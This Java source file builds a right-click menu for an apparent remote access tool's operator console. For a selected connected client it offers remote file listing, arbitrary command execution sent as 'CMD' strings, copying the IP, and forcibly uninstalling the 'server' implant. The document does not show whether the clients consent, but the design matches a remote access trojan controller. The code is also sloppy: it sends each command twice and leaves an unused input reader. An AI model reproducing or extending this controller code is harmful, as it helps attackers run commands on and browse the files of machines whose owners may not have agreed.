package GUI.Components;

import GUI.Controller;
import GUI.ResizeHelper;
import GUI.Views.SendCommandView;
import Logger.Level;
import Logger.Logger;
import Server.ClientObject;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.scene.control.ContextMenu;
import javafx.scene.control.Menu;
import javafx.scene.control.MenuItem;
import javafx.scene.control.TableCell;
import javafx.scene.input.Clipboard;
import javafx.scene.input.ClipboardContent;
import javafx.scene.input.MouseEvent;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

class IPContextMenu implements Repository {
    static ContextMenu getIPContextMenu(TableCell n, MouseEvent e) {
        ClientObject clientObject = ((ClientObject) n.getTableView().getSelectionModel().getSelectedItem());
        ContextMenu cm = new ContextMenu();
        Menu mi1 = new Menu("Perform Action...");
        MenuItem sb1 = new MenuItem("File Explorer");
        sb1.setOnAction(event -> {
            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                clientObject.clientCommunicate("FILELIST");
            }
        });
        MenuItem sb2 = new MenuItem("Send Command");
        sb2.setOnAction(event -> {
            Stage stage = new Stage();
            SendCommandView sendCommandView = new SendCommandView();
            stage.initStyle(StageStyle.UNDECORATED);
            stage.setMinWidth(300);
            stage.setMinWidth(300);
            stage.setScene(new Scene(sendCommandView.getSendCommandView(stage), 400, 400));
            ResizeHelper.addResizeListener(stage);
            stage.show();
            sendCommandView.getsendCommandButton().setOnAction(a -> {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    clientObject.clientCommunicate("CMD " + sendCommandView.getTextField().getText());
                    Platform.runLater(() -> {
                        try {
                            String comm;
                            BufferedReader in = new BufferedReader(new InputStreamReader(clientObject.getClient().getInputStream()));
                            clientObject.clientCommunicate("CMD " + sendCommandView.getTextField().getText());

                        } catch (IOException e1) {
                            e1.printStackTrace();
                        }
                    });
                }
            });
        });
        mi1.getItems().addAll(sb1, sb2);
        MenuItem mi2 = new MenuItem("Copy IP");
        mi2.setOnAction(event -> {
            final Clipboard clipboard = Clipboard.getSystemClipboard();
            final ClipboardContent content = new ClipboardContent();
            content.putString(n.getText());
            clipboard.setContent(content);
        });
        MenuItem mi3 = new MenuItem("Uninstall Server");
        mi3.setOnAction(event -> {
            try {
                if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                    clientObject.clientCommunicate("forciblyclose");
                    if (clientObject.getClient().isConnected()) {
                        clientObject.getClient().close();
                    }
                }
                PseudoBase.getMausData().remove(clientObject.getIP());
                CONNECTIONS.remove(clientObject.getIP());
                Controller.updateStats();
                Controller.updateTable();
            } catch (IOException e1) {
                Logger.log(Level.WARNING, e1.toString());
            }
        });
        cm.getItems().addAll(mi1, mi2, mi3);
        cm.show(n, e.getScreenX(), e.getScreenY());
        return cm;
    }
}
